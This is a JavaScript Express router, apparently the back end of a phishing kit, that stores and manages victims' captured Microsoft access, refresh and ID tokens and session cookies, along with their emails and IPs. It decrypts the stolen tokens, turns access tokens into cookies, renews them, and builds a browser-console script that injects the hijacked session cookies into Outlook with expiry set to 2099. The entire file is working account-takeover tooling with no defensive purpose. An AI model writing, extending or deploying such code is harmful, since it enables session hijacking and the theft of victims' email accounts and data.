const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');

// Get all tokens for user
router.get('/', userAuth, async (req, res) => {
  try {
    const { sort, search, page = 1, limit = 50 } = req.query;
    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
    const params = [req.user.id];
    
    if (search) {
      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
      params.push('%' + search + '%', '%' + search + '%');
    }
    
    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
    
    const offset = (parseInt(page) - 1) * parseInt(limit);
    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), offset);
    
    const [tokens] = await db.query(query, params);
    const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
    
    res.json({
      tokens: tokens,
      total: countResult[0].total,
      page: parseInt(page),
      pages: Math.ceil(countResult[0].total / parseInt(limit)),
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Get single token with decrypted data
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    
    // Decrypt for viewing
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted),
    };
    
    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Update token notes
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query('UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?', [notes || '', req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Soft delete token
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate cookie script with 80-year expiration
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    
    // First try to get stored cookies
    var cookies = decrypt(token.cookies_encrypted);
    
    // If no stored cookies, try to convert from access_token
    if ((!cookies || cookies.trim() === '') && token.access_token_encrypted) {
      const accessToken = decrypt(token.access_token_encrypted);
      if (accessToken) {
        try {
          const cookieConverter = require('../services/cookieconverter');
          const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type);
          if (result.success && result.cookies) {
            cookies = result.cookies;
            // Save cookies for later use
            await db.query(
              'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
              [encrypt(cookies), 'cookie', token.id]
            );
          }
        } catch (convErr) {
          console.error('[Tokens] Cookie conversion error:', convErr.message);
        }
      }
    }
    
    if (!cookies || cookies.trim() === '') {
      return res.status(400).json({ 
        error: 'No cookies available. Please use the Renew button to convert tokens to cookies first.',
        has_access_token: !!token.access_token_encrypted
      });
    }
    
    // Generate document.cookie script with proper formatting
    const cookieArray = cookies.split(';').map(function(c) { return c.trim(); }).filter(function(c) { return c; });
    
    // Build the script
    const lines = [];
    lines.push('// VGenius Cookie Injector - Microsoft Session');
    lines.push('// Cookies expire in 2099 (80+ years)');
    lines.push('');
    lines.push('// Step 1: Go to https://outlook.office365.com/');
    lines.push('// Step 2: Click Cancel if prompted to sign in');
    lines.push('// Step 3: Press F12 -> Console tab');
    lines.push('// Step 4: Paste this script and press Enter');
    lines.push('// Step 5: Wait 3 seconds for automatic redirect...');
    lines.push('');
    
    // Generate cookie injection lines with 80-year expiration
    for (let i = 0; i < cookieArray.length; i++) {
      const c = cookieArray[i];
      const eqIndex = c.indexOf('=');
      if (eqIndex > 0) {
        const cookieName = c.substring(0, eqIndex).trim();
        const cookieValue = c.substring(eqIndex + 1).trim();
        if (cookieName && cookieValue) {
          lines.push('document.cookie = "' + cookieName + '=' + cookieValue + '; path=/; expires=Fri, 18 Dec 2099 23:59:59 UTC; secure; SameSite=None";');
        }
      }
    }
    
    // Add auto-redirect after 3 seconds
    lines.push('');
    lines.push('// All cookies injected! Redirecting to Outlook...');
    lines.push('console.log("Cookies injected successfully!");');
    lines.push('setTimeout(function() {');
    lines.push('  window.location.href = "https://outlook.office365.com/";');
    lines.push('}, 3000);');
    
    const script = lines.join('\n');
    
    res.json({ 
      script: script, 
      cookie_count: cookieArray.length,
      cookies: cookieArray 
    });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// Manual cookie renewal
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    
    // Decrypt access_token
    const accessToken = decrypt(token.access_token_encrypted);
    if (!accessToken) {
      return res.status(400).json({ error: 'No access token available for renewal' });
    }
    
    // Use cookie converter to generate cookies from access_token
    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(
      accessToken, 
      token.template_type,
      '', // tenant
      ''  // email
    );
    
    if (result.success && result.cookies) {
      // Update the token with converted cookies
      await db.query(
        'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
        [encrypt(result.cookies), 'cookie', token.id]
      );
      
      res.json({ 
        success: true, 
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length
      });
    } else {
      res.status(400).json({ 
        error: result.error || 'Conversion failed',
        success: false
      });
    }
  } catch (err) {
    console.error('[Tokens] Renewal error:', err);
    res.status(500).json({ error: 'Renewal failed: ' + err.message });
  }
});

// Get renewal history
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Export tokens
router.post('/export', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );
    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Export and delete all
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );
    
    // Soft delete all
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
    
    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length, deleted: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
